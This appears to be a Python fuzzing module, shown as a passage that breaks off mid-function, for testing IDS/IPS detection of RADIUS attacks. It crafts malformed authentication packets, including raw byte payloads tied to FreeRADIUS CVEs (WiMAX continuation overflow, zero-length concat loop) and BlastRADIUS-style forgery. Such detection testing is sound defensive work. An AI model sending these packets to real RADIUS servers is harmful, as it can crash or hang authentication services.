import random
import struct
import hashlib
import os

# ---------------------------------------------------------------------------
# RADIUS mutation strategies for IDS/IPS fault & vulnerability testing.
#
# Grounded in:
#   - RFC 2865  (RADIUS Authentication, June 2000)
#   - RFC 2866  (RADIUS Accounting)
#   - RFC 3579  (RADIUS/EAP — EAP-Message attr 79, Message-Authenticator attr 80)
#   - RFC 5176  (Dynamic Authorization Extensions — CoA/Disconnect, port 3799)
#   - RFC 6929  (RADIUS Protocol Extensions — Extended/Long-Extended/TLV/EVS/int64)
#
# CVE grounding:
#   - CVE-2024-3596  BlastRADIUS — MD5 chosen-prefix collision on Response
#                     Authenticator via Proxy-State injection.
#   - CVE-2017-10978 (FR-GV-201) make_secret() 16-byte overflow on
#                     Ascend-Send-Secret near max packet size.
#   - CVE-2017-10979 (FR-GV-202) rad_coalesce() WiMAX continuation overflow.
#   - CVE-2017-10984 (FR-GV-301) data2vp_wimax() write overflow — RCE.
#   - CVE-2017-10985 (FR-GV-302) Infinite loop on zero-length concat attrs.
#   - FreeRADIUS 2026 NAS-Filter-Rule pre-auth crash (long attr 92).
#
# Snort detection model: Snort 3 has NO dedicated stateful RADIUS inspector.
# Detection is via generic content/byte_test rules on UDP 1812/1813 + AppID.
# RADIUS is binary, so Snort rules use byte_test, byte_extract, content for
# specific Code/Type fields.  Similar to SNMP/DHCP detection pattern.
#
# Every payload is a RAW UDP payload (no IP/UDP framing — the transport layer
# adds that).  build_radius_payload() returns (payload, dst_port).  Ports:
#   1812 = Authentication, 1813 = Accounting, 3799 = CoA/Disconnect.
# Each payload begins with a structurally valid RADIUS header (Code, ID,
# Length, Authenticator) so Snort's fast-pattern matcher binds the flow as
# RADIUS BEFORE hitting the malicious attribute bytes.
# ---------------------------------------------------------------------------

RADIUS_STRATEGIES = [
    "authenticator_manipulation",
    "attribute_tlv_overflow",
    "user_password_encryption_abuse",
    "vendor_specific_overflow",
    "wimax_continuation_attack",
    "eap_message_fragmentation",
    "message_authenticator_malform",
    "extended_attribute_abuse",
    "length_field_desync",
    "code_confusion",
    "proxy_state_injection",
    "coa_disconnect_abuse",
    "accounting_desync",
    "nas_filter_rule_crash",
    "ip_frag_cache_exhaustion",
    "udp_session_spray",
]

RADIUS_WEIGHTS = [12, 10, 8, 8, 14, 8, 10, 6, 10, 5, 12, 6, 5, 8, 8, 6]

RADIUS_STRATEGY_LABELS = {
    "authenticator_manipulation":       "Authenticator Manipulation (BlastRADIUS)",
    "attribute_tlv_overflow":           "Attribute TLV Overflow",
    "user_password_encryption_abuse":   "User-Password Encryption Abuse",
    "vendor_specific_overflow":         "Vendor-Specific Attribute Overflow",
    "wimax_continuation_attack":        "WiMAX Continuation Attack (CVE-2017-10984)",
    "eap_message_fragmentation":        "EAP-Message Fragmentation",
    "message_authenticator_malform":    "Message-Authenticator Malform",
    "extended_attribute_abuse":         "Extended Attribute Abuse (RFC 6929)",
    "length_field_desync":              "Length Field Desync",
    "code_confusion":                   "Code / Type Confusion",
    "proxy_state_injection":            "Proxy-State Injection (BlastRADIUS)",
    "coa_disconnect_abuse":             "CoA / Disconnect Abuse (RFC 5176)",
    "accounting_desync":                "Accounting Desync",
    "nas_filter_rule_crash":            "NAS-Filter-Rule Pre-Auth Crash",
    "ip_frag_cache_exhaustion":        "IP Fragment Cache Exhaustion (stream_ip.max_frags)",
    "udp_session_spray":               "UDP Session Spray (flow cache exhaustion)",
}

# Keep payloads inside a single UDP datagram.
_MAX_UDP = 65000

# ── RADIUS constants ──────────────────────────────────────────────────────
# Packet codes (RFC 2865 §3, RFC 5176)
_CODE_ACCESS_REQUEST      = 1
_CODE_ACCESS_ACCEPT       = 2
_CODE_ACCESS_REJECT       = 3
_CODE_ACCOUNTING_REQUEST  = 4
_CODE_ACCOUNTING_RESPONSE = 5
_CODE_ACCESS_CHALLENGE    = 11
_CODE_STATUS_SERVER       = 12
_CODE_STATUS_CLIENT       = 13
_CODE_DISCONNECT_REQUEST  = 40
_CODE_DISCONNECT_ACK      = 41
_CODE_DISCONNECT_NAK      = 42
_CODE_COA_REQUEST         = 43
_CODE_COA_ACK             = 44
_CODE_COA_NAK             = 45

# Attribute types (RFC 2865 §5, RFC 2866 §5, RFC 3579, RFC 5176, RFC 6929)
_ATTR_USER_NAME              = 1
_ATTR_USER_PASSWORD          = 2
_ATTR_CHAP_PASSWORD          = 3
_ATTR_NAS_IP_ADDRESS         = 4
_ATTR_NAS_PORT               = 5
_ATTR_SERVICE_TYPE           = 6
_ATTR_FRAMED_PROTOCOL        = 7
_ATTR_FRAMED_IP_ADDRESS      = 8
_ATTR_REPLY_MESSAGE          = 18
_ATTR_STATE                  = 24
_ATTR_CLASS                  = 25
_ATTR_VENDOR_SPECIFIC        = 26
_ATTR_SESSION_TIMEOUT        = 27
_ATTR_CALLED_STATION_ID      = 30
_ATTR_CALLING_STATION_ID     = 31
_ATTR_NAS_IDENTIFIER         = 32
_ATTR_PROXY_STATE            = 33
_ATTR_ACCT_STATUS_TYPE       = 40
_ATTR_ACCT_DELAY_TIME        = 41
_ATTR_ACCT_INPUT_OCTETS      = 42
_ATTR_ACCT_OUTPUT_OCTETS     = 43
_ATTR_ACCT_SESSION_ID        = 44
_ATTR_ACCT_AUTHENTIC         = 45
_ATTR_ACCT_SESSION_TIME      = 46
_ATTR_ACCT_TERMINATE_CAUSE   = 49
_ATTR_NAS_PORT_TYPE          = 61
_ATTR_EAP_MESSAGE            = 79
_ATTR_MESSAGE_AUTHENTICATOR  = 80
_ATTR_NAS_FILTER_RULE        = 92
_ATTR_ERROR_CAUSE            = 101
# RFC 6929 Extended-Type space
_ATTR_EXTENDED_1             = 241
_ATTR_EXTENDED_2             = 242
_ATTR_EXTENDED_3             = 243
_ATTR_EXTENDED_4             = 244
_ATTR_LONG_EXTENDED_1        = 245
_ATTR_LONG_EXTENDED_2        = 246

# Well-known Vendor IDs (SMI Private Enterprise Numbers)
_VENDOR_CISCO     = 9
_VENDOR_MICROSOFT = 311
_VENDOR_3GPP      = 10415
_VENDOR_WIMAX     = 24757


# ── Helpers ───────────────────────────────────────────────────────────────

def _rand_authenticator():
    """16 random bytes for Request Authenticator."""
    return os.urandom(16)

def _zero_authenticator():
    """16 zero bytes (for Accounting-Request / CoA-Request authenticator)."""
    return b"\x00" * 16

def _rand_id():
    """Random 1-byte Identifier."""
    return random.randint(0, 255)

def _rand_ip():
    """Random IPv4 address bytes (4 octets)."""
    return struct.pack("!I", random.randint(0x01000001, 0xFEFFFFFF))

def _rand_bytes(n):
    return os.urandom(n)

def _tlv(attr_type, value):
    """Build a standard RADIUS TLV attribute. Length includes Type+Length fields."""
    length = 2 + len(value)
    if length > 255:
        value = value[:253]
        length = 255
    return struct.pack("BB", attr_type, length) + value

def _tlv_raw(attr_type, length_byte, value):
    """Build a TLV with an explicit (possibly wrong) length byte."""
    return struct.pack("BB", attr_type, length_byte) + value

def _vendor_attr(vendor_id, vendor_type, vendor_value):
    """Build a Vendor-Specific attribute (Type 26)."""
    inner = struct.pack("BB", vendor_type, 2 + len(vendor_value)) + vendor_value
    vsa_value = struct.pack("!I", vendor_id) + inner
    return _tlv(_ATTR_VENDOR_SPECIFIC, vsa_value)

def _radius_packet(code, identifier, authenticator, attributes):
    """Build a complete RADIUS packet."""
    attrs_bytes = b"".join(attributes)
    length = 20 + len(attrs_bytes)
    header = struct.pack("!BBH", code, identifier, length)
    return header + authenticator + attrs_bytes

def _radius_packet_raw_length(code, identifier, authenticator, attributes, length_override):
    """Build a RADIUS packet with an explicit (possibly wrong) Length field."""
    attrs_bytes = b"".join(attributes)
    header = struct.pack("!BBH", code, identifier, length_override)
    return header + authenticator + attrs_bytes

def _clamp(payload):
    """Clamp to max UDP datagram size."""
    return payload[:_MAX_UDP] if len(payload) > _MAX_UDP else payload

def _base_access_request_attrs():
    """Common attributes for a plausible Access-Request."""
    return [
        _tlv(_ATTR_USER_NAME, b"fuzzer@test.local"),
        _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
        _tlv(_ATTR_NAS_PORT, struct.pack("!I", random.randint(1, 65535))),
        _tlv(_ATTR_NAS_PORT_TYPE, struct.pack("!I", 15)),  # Ethernet
    ]

def _base_accounting_attrs():
    """Common attributes for a plausible Accounting-Request."""
    return [
        _tlv(_ATTR_USER_NAME, b"acctuser@test.local"),
        _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
        _tlv(_ATTR_ACCT_STATUS_TYPE, struct.pack("!I", random.choice([1, 2, 3]))),
        _tlv(_ATTR_ACCT_SESSION_ID, f"sess-{random.randint(100000, 999999)}".encode()),
    ]


# ── Strategy builders ─────────────────────────────────────────────────────

def _build_authenticator_manipulation():
    """Strategy 1: Authenticator field manipulation (BlastRADIUS surface).

    Targets the MD5-based authentication model. Variants:
    - all_zero_in_access_request: use Accounting-style zero auth in Access-Request
    - predictable_auth: incrementing/patterned authenticator
    - response_auth_forgery: craft a fake Access-Accept with forged Response Authenticator
    - truncated_auth: authenticator shorter than 16 bytes (packet ends mid-auth)
    - repeated_auth: same authenticator across many packets
    - md5_prefix_injection: collision-favorable prefix bytes in authenticator
    """
    variant = random.choice([
        "all_zero_in_access_request", "predictable_auth", "response_auth_forgery",
        "truncated_auth", "repeated_auth", "md5_prefix_injection",
    ])
    ident = _rand_id()

    if variant == "all_zero_in_access_request":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, _zero_authenticator(), attrs), 1812
    elif variant == "predictable_auth":
        auth = bytes([ident & 0xFF]) * 16
        attrs = _base_access_request_attrs()
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    elif variant == "response_auth_forgery":
        # Forge an Access-Accept with a fake Response Authenticator
        fake_secret = b"fakesecret123456"
        attrs = [_tlv(_ATTR_SERVICE_TYPE, struct.pack("!I", 2)),
                 _tlv(_ATTR_FRAMED_PROTOCOL, struct.pack("!I", 1))]
        attrs_bytes = b"".join(attrs)
        length = 20 + len(attrs_bytes)
        req_auth = _rand_authenticator()
        # ResponseAuth = MD5(Code+ID+Length+RequestAuth+Attrs+Secret)
        resp_auth = hashlib.md5(
            struct.pack("!BBH", _CODE_ACCESS_ACCEPT, ident, length)
            + req_auth + attrs_bytes + fake_secret
        ).digest()
        return _radius_packet(_CODE_ACCESS_ACCEPT, ident, resp_auth, attrs), 1812
    elif variant == "truncated_auth":
        # Packet that ends inside the authenticator field
        attrs = _base_access_request_attrs()
        pkt = _radius_packet(_CODE_ACCESS_REQUEST, ident, _rand_authenticator(), attrs)
        cut = random.randint(5, 19)  # cut inside authenticator (bytes 4-19)
        return pkt[:cut], 1812
    elif variant == "repeated_auth":
        auth = _rand_authenticator()
        packets = []
        for i in range(random.randint(50, 200)):
            attrs = _base_access_request_attrs()
            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
            packets.append(_radius_packet(_CODE_ACCESS_REQUEST, i & 0xFF, auth, attrs))
        return b"".join(packets)[:_MAX_UDP], 1812
    else:  # md5_prefix_injection
        # Inject bytes that could help an MD5 chosen-prefix collision
        auth = hashlib.md5(os.urandom(64)).digest()
        attrs = _base_access_request_attrs()
        # Add many Proxy-State attributes (BlastRADIUS collision vector)
        for _ in range(random.randint(10, 50)):
            attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(random.randint(4, 253))))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_attribute_tlv_overflow():
    """Strategy 2: Attribute TLV parsing attacks.

    Targets the Type-Length-Value attribute parser. Variants:
    - zero_length: attribute with Length=0 (invalid, min is 3)
    - length_one: attribute with Length=1 (only Type byte, no Length field value)
    - length_exceeds_packet: Length field says more data than remaining packet
    - type_zero: attribute with Type=0 (reserved/undefined)
    - unknown_high_type: Type in 192-240 range (experimental/implementation-specific)
    - zero_value: attribute with Length=2 (Type+Length, no value)
    - many_tiny_attrs: flood of minimal-length attributes
    """
    variant = random.choice([
        "zero_length", "length_one", "length_exceeds_packet", "type_zero",
        "unknown_high_type", "zero_value", "many_tiny_attrs",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()

    if variant == "zero_length":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv_raw(_ATTR_USER_NAME, 0, b""))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    elif variant == "length_one":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv_raw(_ATTR_USER_NAME, 1, b""))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    elif variant == "length_exceeds_packet":
        attrs = _base_access_request_attrs()
        # Declare length 255 but provide only 10 bytes of value
        attrs.append(_tlv_raw(_ATTR_REPLY_MESSAGE, 255, os.urandom(10)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    elif variant == "type_zero":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv_raw(0, 10, os.urandom(8)))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    elif variant == "unknown_high_type":
        attrs = _base_access_request_attrs()
        for t in range(192, 240):
            attrs.append(_tlv(t, os.urandom(random.randint(1, 20))))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    elif variant == "zero_value":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv_raw(_ATTR_STATE, 2, b""))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    else:  # many_tiny_attrs
        attrs = _base_access_request_attrs()
        for _ in range(random.randint(200, 500)):
            t = random.randint(1, 255)
            attrs.append(_tlv(t, os.urandom(1)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_user_password_encryption_abuse(payload_override=None):
    """Strategy 3: User-Password encryption chain abuse (RFC 2865 §5.2).

    Targets the MD5 XOR chain cipher. Variants:
    - oversized_password: password > 128 chars (max per RFC)
    - non_multiple_16: password length not a multiple of 16
    - empty_password: zero-length password field
    - all_zeros: password all zero bytes (exposed shared secret via XOR)
    - all_ff: password all 0xFF bytes
    - max_length_attr: exactly 130 bytes (2+128 max User-Password attr)
    """
    if payload_override is not None:
        ident = _rand_id()
        auth = _rand_authenticator()
        attrs = _base_access_request_attrs()
        attrs.append(_tlv(_ATTR_USER_PASSWORD, payload_override))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    variant = random.choice([
        "oversized_password", "non_multiple_16", "empty_password",
        "all_zeros", "all_ff", "max_length_attr",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "oversized_password":
        # Way over 128 chars
        pwd = os.urandom(random.randint(200, 253))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, pwd))
    elif variant == "non_multiple_16":
        # 7, 13, 25 bytes — not padded to 16-boundary
        pwd = os.urandom(random.choice([7, 13, 25, 33, 47]))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, pwd))
    elif variant == "empty_password":
        # Length = 2 (Type + Length, no value)
        attrs.append(_tlv_raw(_ATTR_USER_PASSWORD, 2, b""))
    elif variant == "all_zeros":
        pwd = b"\x00" * random.choice([16, 32, 64, 128])
        attrs.append(_tlv(_ATTR_USER_PASSWORD, pwd))
    elif variant == "all_ff":
        pwd = b"\xff" * random.choice([16, 32, 64, 128])
        attrs.append(_tlv(_ATTR_USER_PASSWORD, pwd))
    else:  # max_length_attr
        pwd = os.urandom(128)
        attrs.append(_tlv(_ATTR_USER_PASSWORD, pwd))

    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_vendor_specific_overflow():
    """Strategy 4: Vendor-Specific attribute (Type 26) abuse (RFC 2865 §5.26).

    Variants:
    - zero_vendor_id: Vendor-Id = 0
    - max_vendor_id: Vendor-Id = 0xFFFFFFFF
    - vendor_length_overflow: vendor-length > enclosing VSA length
    - zero_vendor_data: empty vendor data after Vendor-Id
    - nested_vsa_bomb: many sub-attributes inside one VSA
    - bogus_smi: non-existent SMI enterprise number
    """
    variant = random.choice([
        "zero_vendor_id", "max_vendor_id", "vendor_length_overflow",
        "zero_vendor_data", "nested_vsa_bomb", "bogus_smi",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "zero_vendor_id":
        inner = struct.pack("BB", 1, 10) + os.urandom(8)
        vsa_val = struct.pack("!I", 0) + inner
        attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    elif variant == "max_vendor_id":
        inner = struct.pack("BB", 1, 10) + os.urandom(8)
        vsa_val = struct.pack("!I", 0xFFFFFFFF) + inner
        attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    elif variant == "vendor_length_overflow":
        # Inner vendor-length claims 200 bytes but only 10 available
        inner = struct.pack("BB", 1, 200) + os.urandom(10)
        vsa_val = struct.pack("!I", _VENDOR_CISCO) + inner
        attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    elif variant == "zero_vendor_data":
        # VSA with only the 4-byte Vendor-Id, no sub-attributes
        vsa_val = struct.pack("!I", _VENDOR_MICROSOFT)
        attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    elif variant == "nested_vsa_bomb":
        inner_parts = []
        for i in range(random.randint(30, 80)):
            sub_val = os.urandom(random.randint(1, 6))
            inner_parts.append(struct.pack("BB", (i % 255) + 1, 2 + len(sub_val)) + sub_val)
        vsa_val = struct.pack("!I", _VENDOR_3GPP) + b"".join(inner_parts)
        if len(vsa_val) > 253:
            vsa_val = vsa_val[:253]
        attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    else:  # bogus_smi
        inner = struct.pack("BB", 1, 12) + os.urandom(10)
        vsa_val = struct.pack("!I", random.randint(100000, 999999)) + inner
        attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))

    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_wimax_continuation_attack():
    """Strategy 5: WiMAX continuation attribute attack (CVE-2017-10984/10985).

    Targets WiMAX (Vendor-Id 24757) continuation flag handling. Variants:
    - continuation_no_data: continuation flag set but no subsequent data (RCE: CVE-2017-10984)
    - zero_length_concat: zero-length 'concat' attributes (infinite loop: CVE-2017-10985)
    - oversized_continuation_chain: massive chain of continuation fragments
    - mixed_continuation_normal: alternating continuation and normal attrs
    - continuation_flag_all: every attr has continuation flag set
    - single_byte_fragments: continuation chain of 1-byte values
    """
    variant = random.choice([
        "continuation_no_data", "zero_length_concat",
        "oversized_continuation_chain", "mixed_continuation_normal",
        "continuation_flag_all", "single_byte_fragments",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "continuation_no_data":
        # WiMAX VSA with continuation flag (0x80) set on vendor-type but no data
        # Reproduces CVE-2017-10984 (write overflow in data2vp_wimax)
        # \x1a\x0a = VSA Type 26, Length 10
        # \x00\x00\x60\xb5 = WiMAX Vendor-Id 24757
        # \x2c\x04\x80\x00 = vendor-type 44, vendor-len 4, flags=0x80 (continuation), no data
        wimax_vsa = (b"\x1a\x0a\x00\x00\x60\xb5\x2c\x04\x80\x00"
                     b"\x1a\x09\x00\x00\x60\xb5\x2c\xfa\x00")
        return _radius_packet_raw_length(
            _CODE_ACCESS_REQUEST, ident, auth,
            [b"".join(_base_access_request_attrs()), wimax_vsa],
            20 + sum(len(a) for a in _base_access_request_attrs()) + len(wimax_vsa)
        ), 1812
    elif variant == "zero_length_concat":
        # Zero-length concat attributes — CVE-2017-10985 infinite loop
        # Attr types that trigger concat path in FreeRADIUS: 79(EAP), 137(0x89), 144(0x90), 180(0xb4)
        concat_types = [0x4f, 0x89, 0x90, 0xb4]
        for ct in concat_types:
            attrs.append(struct.pack("BB", ct, 2))  # Length=2 = zero value
    elif variant == "oversized_continuation_chain":
        # Long chain of WiMAX continuation VSAs
        for i in range(random.randint(50, 150)):
            flags = 0x80 if i < 149 else 0x00  # continuation except last
            val = os.urandom(random.randint(4, 20))
            inner = struct.pack("BBB", 44, 3 + len(val), flags) + val
            vsa_val = struct.pack("!I", _VENDOR_WIMAX) + inner
            attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    elif variant == "mixed_continuation_normal":
        for i in range(random.randint(20, 60)):
            if i % 2 == 0:
                # WiMAX continuation
                val = os.urandom(10)
                inner = struct.pack("BBB", 44, 3 + len(val), 0x80) + val
                vsa_val = struct.pack("!I", _VENDOR_WIMAX) + inner
                attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
            else:
                # Normal attribute
                attrs.append(_tlv(_ATTR_CLASS, os.urandom(8)))
    elif variant == "continuation_flag_all":
        # Every WiMAX VSA has continuation flag — parser never gets termination
        for _ in range(random.randint(30, 100)):
            val = os.urandom(random.randint(1, 30))
            inner = struct.pack("BBB", random.randint(1, 50), 3 + len(val), 0x80) + val
            vsa_val = struct.pack("!I", _VENDOR_WIMAX) + inner
            attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))
    else:  # single_byte_fragments
        for i in range(random.randint(100, 300)):
            flags = 0x80 if i < 299 else 0x00
            inner = struct.pack("BBB", 44, 4, flags) + bytes([i & 0xFF])
            vsa_val = struct.pack("!I", _VENDOR_WIMAX) + inner
            attrs.append(_tlv(_ATTR_VENDOR_SPECIFIC, vsa_val))

    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_eap_message_fragmentation():
    """Strategy 6: EAP-Message (attr 79) fragmentation attacks (RFC 3579).

    EAP packets > 253 bytes are split across multiple EAP-Message attributes.
    Variants:
    - oversized_eap: huge EAP payload across many 253-byte chunks
    - truncated_final_chunk: last EAP-Message chunk is truncated
    - eap_without_msg_auth: EAP-Message present but no Message-Authenticator
    - eap_type_confusion: conflicting EAP type codes across fragments
    - single_byte_eap_fragments: many EAP-Message attrs with 1-byte values
    - eap_identity_overflow: oversized EAP-Identity payload
    """
    variant = random.choice([
        "oversized_eap", "truncated_final_chunk", "eap_without_msg_auth",
        "eap_type_confusion", "single_byte_eap_fragments", "eap_identity_overflow",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "oversized_eap":
        # EAP packet header: Code(1)=Request, Id(1), Length(2), Type(1)=Identity(1)
        eap_data = struct.pack("!BBH", 1, ident, 2000) + b"\x01" + os.urandom(1995)
        offset = 0
        while offset < len(eap_data):
            chunk = eap_data[offset:offset + 253]
            attrs.append(_tlv(_ATTR_EAP_MESSAGE, chunk))
            offset += 253
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
    elif variant == "truncated_final_chunk":
        eap_data = struct.pack("!BBH", 1, ident, 600) + b"\x01" + os.urandom(595)
        chunks = []
        offset = 0
        while offset < len(eap_data):
            chunks.append(eap_data[offset:offset + 253])
            offset += 253
        for i, chunk in enumerate(chunks):
            if i == len(chunks) - 1:
                # Truncate the last chunk
                attrs.append(_tlv(_ATTR_EAP_MESSAGE, chunk[:random.randint(1, max(1, len(chunk) // 2))]))
            else:
                attrs.append(_tlv(_ATTR_EAP_MESSAGE, chunk))
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
    elif variant == "eap_without_msg_auth":
        eap_data = struct.pack("!BBH", 1, ident, 20) + b"\x01" + b"identity@test"
        attrs.append(_tlv(_ATTR_EAP_MESSAGE, eap_data))
        # Deliberately omit Message-Authenticator
    elif variant == "eap_type_confusion":
        for eap_type in [1, 4, 13, 21, 25, 43, 52, 254]:
            eap_data = struct.pack("!BBH", 1, ident, 10) + bytes([eap_type]) + os.urandom(5)
            attrs.append(_tlv(_ATTR_EAP_MESSAGE, eap_data))
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
    elif variant == "single_byte_eap_fragments":
        for i in range(random.randint(100, 250)):
            attrs.append(_tlv(_ATTR_EAP_MESSAGE, bytes([i & 0xFF])))
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
    else:  # eap_identity_overflow
        eap_identity = struct.pack("!BBH", 2, ident, 258) + b"\x01" + b"A" * 253
        attrs.append(_tlv(_ATTR_EAP_MESSAGE, eap_identity[:253]))
        attrs.append(_tlv(_ATTR_EAP_MESSAGE, eap_identity[253:]))
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))

    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_message_authenticator_malform():
    """Strategy 7: Message-Authenticator (attr 80) malformation (RFC 3579 §3.2).

    Variants:
    - wrong_length: Message-Authenticator with Length != 18
    - corrupt_hmac: valid-length but garbage HMAC value
    - duplicate: two Message-Authenticator attributes
    - missing_when_eap: EAP-Message present but Message-Authenticator absent
    - wrong_key_hmac: HMAC computed with wrong shared secret
    - oversized_hmac: Message-Authenticator with value > 16 bytes
    """
    variant = random.choice([
        "wrong_length", "corrupt_hmac", "duplicate",
        "missing_when_eap", "wrong_key_hmac", "oversized_hmac",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "wrong_length":
        # Should be exactly 18 (2+16), make it wrong
        bad_len = random.choice([2, 5, 10, 20, 34, 255])
        val = os.urandom(max(0, bad_len - 2))
        attrs.append(_tlv_raw(_ATTR_MESSAGE_AUTHENTICATOR, bad_len, val))
    elif variant == "corrupt_hmac":
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
    elif variant == "duplicate":
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16)))
    elif variant == "missing_when_eap":
        eap = struct.pack("!BBH", 1, ident, 10) + b"\x01" + b"test"
        attrs.append(_tlv(_ATTR_EAP_MESSAGE, eap))
        # No Message-Authenticator
    elif variant == "wrong_key_hmac":
        # Compute HMAC with a definitely-wrong key
        import hmac as hmac_mod
        fake_key = b"definitely_wrong_secret"
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        pkt_for_hmac = _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs + [_tlv(_ATTR_MESSAGE_AUTHENTICATOR, b"\x00" * 16)])
        mac = hmac_mod.new(fake_key, pkt_for_hmac, hashlib.md5).digest()
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, mac))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    else:  # oversized_hmac
        attrs.append(_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(random.randint(32, 253))))

    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_extended_attribute_abuse():
    """Strategy 8: Extended attribute abuse (RFC 6929).

    Targets Extended-Type (241-244), Long-Extended-Type (245-246), TLV nesting, EVS.
    Variants:
    - extended_short_length: Extended-Type with Length < 4 (invalid)
    - long_extended_m_bit: Long-Extended with M=1 but Length < 255
    - non_contiguous_fragments: fragmented Long-Extended with gaps
    - tlv_nesting_bomb: deeply nested TLV sub-attributes
    - evs_invalid_vendor: Extended-Vendor-Specific with invalid Vendor-Id
    - m_bit_on_last: M bit set on the last attribute in the packet
    """
    variant = random.choice([
        "extended_short_length", "long_extended_m_bit", "non_contiguous_fragments",
        "tlv_nesting_bomb", "evs_invalid_vendor", "m_bit_on_last",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "extended_short_length":
        # Extended-Type attr with Length=3 (just Type+Length+ExtType, no value)
        attrs.append(struct.pack("BBB", _ATTR_EXTENDED_1, 3, 1))
        # And one with Length=2 (even ExtType is missing)
        attrs.append(struct.pack("BB", _ATTR_EXTENDED_2, 2))
    elif variant == "long_extended_m_bit":
        # Long Extended Type with M=1 but Length only 10 (should be 255 when M=1)
        ext_type = 1
        m_flags = 0x80  # M bit set
        value = os.urandom(6)
        attrs.append(struct.pack("BBBB", _ATTR_LONG_EXTENDED_1, 4 + len(value),
                                 ext_type, m_flags) + value)
    elif variant == "non_contiguous_fragments":
        # Fragment 1 (M=1) then a normal attr then fragment 2 (M=0)
        ext_type = 5
        frag1 = struct.pack("BBBB", _ATTR_LONG_EXTENDED_1, 30, ext_type, 0x80) + os.urandom(26)
        normal = _tlv(_ATTR_CLASS, os.urandom(8))
        frag2 = struct.pack("BBBB", _ATTR_LONG_EXTENDED_1, 20, ext_type, 0x00) + os.urandom(16)
        attrs.extend([frag1, normal, frag2])
    elif variant == "tlv_nesting_bomb":
        # Deeply nested TLV data type within an Extended-Type attribute
        depth = random.randint(10, 30)
        inner = os.urandom(4)
        for _ in range(depth):
